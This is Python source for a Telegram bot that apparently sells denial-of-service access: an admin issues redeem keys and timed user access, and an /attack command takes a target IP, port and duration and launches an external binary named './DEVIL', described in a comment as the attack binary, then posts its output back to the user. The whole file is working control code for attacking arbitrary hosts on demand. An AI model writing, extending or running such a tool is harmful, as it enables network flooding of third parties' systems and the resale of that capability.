import logging
import asyncio
import random
import string
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_ID

# Logging setup
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables
redeem_codes = {}  # {code: custom_name}
authorized_users_data = {}  # {user_id: expiry_timestamp (None for permanent)}

# Path to your binary
BINARY_PATH = "./DEVIL"  # Path to the attack binary

# Helper functions
def is_valid_ip(ip):
    import re
    pattern = re.compile(
        r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    )
    return pattern.match(ip) is not None

def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def check_user_expiry(user_id):
    if user_id in authorized_users_data:
        expiry = authorized_users_data[user_id]
        if expiry is None or expiry > time.time():
            return True
        del authorized_users_data[user_id]
    return False

# Command: /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID or check_user_expiry(user_id):
        await update.message.reply_text(
            "🔥 Welcome to the bot 🔥\n\n"
            "Available Commands:\n"
            "/attack <ip> <port> <duration>\n"
            "/gen_key - Generate a random key\n"
            "/gen_custom_name_key <name> - Generate a key with a custom name\n"
            "/redeem <key> - Redeem a code\n"
            "/delete_code <key> - Delete a redeem code\n"
            "/list_codes - List all redeem codes\n"
            "/add <id> <minutes/day> - Add a user with optional expiry\n"
            "/remove <id> - Remove a user\n"
            "/users - List all allowed users"
        )
    else:
        await update.message.reply_text("❌ You are not authorized to use this bot!")

# Command: /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Start the bot\n"
        "/help - Show this help message\n"
        "/gen_key - Generate a random key\n"
        "/gen_custom_name_key <name> - Generate a key with a custom name\n"
        "/redeem <key> - Redeem a code\n"
        "/delete_code <key> - Delete a redeem code\n"
        "/list_codes - List all redeem codes\n"
        "/add <id> <minutes/day> - Add a user with optional expiry\n"
        "/remove <id> - Remove a user\n"
        "/users - List all allowed users\n"
        "/attack <ip> <port> <duration> - Launch an attack"
    )

# Command: /gen_key
async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        redeem_codes[key] = "DEFAULT"
        await update.message.reply_text(f"Generated key: {key}")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /gen_custom_name_key <name>
async def gen_custom_name_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if context.args:
            custom_name = " ".join(context.args)
            key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
            redeem_codes[key] = custom_name
            await update.message.reply_text(f"Generated key: {key} (Name: {custom_name})")
        else:
            await update.message.reply_text("⚠️ Usage: /gen_custom_name_key <custom_name>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /redeem <key>
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        key = context.args[0]
        if key in redeem_codes:
            authorized_users_data[user_id] = None
            del redeem_codes[key]
            await update.message.reply_text("✅ Code redeemed successfully! You now have access.")
        else:
            await update.message.reply_text("❌ Invalid or expired code.")
    else:
        await update.message.reply_text("⚠️ Usage: /redeem <key>")

# Command: /delete_code <key>
async def delete_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if context.args:
            key = context.args[0]
            if key in redeem_codes:
                del redeem_codes[key]
                await update.message.reply_text(f"✅ Code '{key}' deleted.")
            else:
                await update.message.reply_text("❌ Code not found.")
        else:
            await update.message.reply_text("⚠️ Usage: /delete_code <key>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /list_codes
async def list_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if redeem_codes:
            codes_list = "\n".join([f"{key}: {name}" for key, name in redeem_codes.items()])
            await update.message.reply_text(f"📜 Available Redeem Codes:\n{codes_list}")
        else:
            await update.message.reply_text("📜 No redeem codes available.")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /add <id> <minutes/day>
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if len(context.args) >= 2:
            target_id = int(context.args[0])
            time_value = context.args[1]

            if time_value.endswith("day"):
                expiry = time.time() + int(time_value[:-3]) * 86400
            elif time_value.endswith("minutes"):
                expiry = time.time() + int(time_value[:-7]) * 60
            else:
                await update.message.reply_text("❌ Invalid time format. Use 'minutes' or 'day'.")
                return

            authorized_users_data[target_id] = expiry
            await update.message.reply_text(f"✅ User {target_id} added with expiry.")
        else:
            await update.message.reply_text("⚠️ Usage: /add <id> <minutes/day>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /remove <id>
async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if context.args:
            target_id = int(context.args[0])
            if target_id in authorized_users_data:
                del authorized_users_data[target_id]
                await update.message.reply_text(f"✅ User {target_id} removed.")
            else:
                await update.message.reply_text("❌ User not found.")
        else:
            await update.message.reply_text("⚠️ Usage: /remove <id>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /users
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        if authorized_users_data:
            users_list = "\n".join(
                [f"{user}: {'Permanent' if expiry is None else 'Expires in {:.2f} minutes'.format((expiry - time.time()) / 60)}"
                 for user, expiry in authorized_users_data.items()]
            )
            await update.message.reply_text(f"📜 Authorized Users:\n{users_list}")
        else:
            await update.message.reply_text("📜 No authorized users.")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

# Command: /attack <ip> <port> <duration>
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID or check_user_expiry(user_id):
        if len(context.args) == 3:
            target_ip, port, duration = context.args
            if not is_valid_ip(target_ip):
                await update.message.reply_text("❌ Invalid IP address.")
                return
            if not is_valid_port(port):
                await update.message.reply_text("❌ Invalid port number.")
                return
            try:
                duration = int(duration)
                if duration <= 0:
                    await update.message.reply_text("❌ Duration must be greater than zero.")
                    return

                await update.message.reply_text(
                    f"⚔️ Attack launched on {target_ip}:{port} for {duration} seconds. Please wait for results..."
                )
                asyncio.create_task(run_attack(update, target_ip, port, duration))
            except ValueError:
                await update.message.reply_text("❌ Invalid duration. Please enter a valid number.")
        else:
            await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")

async def run_attack(update, target_ip, port, duration):
    command = f"{BINARY_PATH} {target_ip} {port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stderr:
            await update.message.reply_text(f"❌ Attack error: {stderr.decode()}")
        else:
            await update.message.reply_text(f"✅ Attack completed:\n{stdout.decode()}")
    except Exception as e:
        logger.error(f"Error while running attack: {e}")
        await update.message.reply_text(f"❌ Failed to execute attack: {e}")

# Command registration and main
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("gen_key", gen_key))
    application.add_handler(CommandHandler("gen_custom_name_key", gen_custom_name_key))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
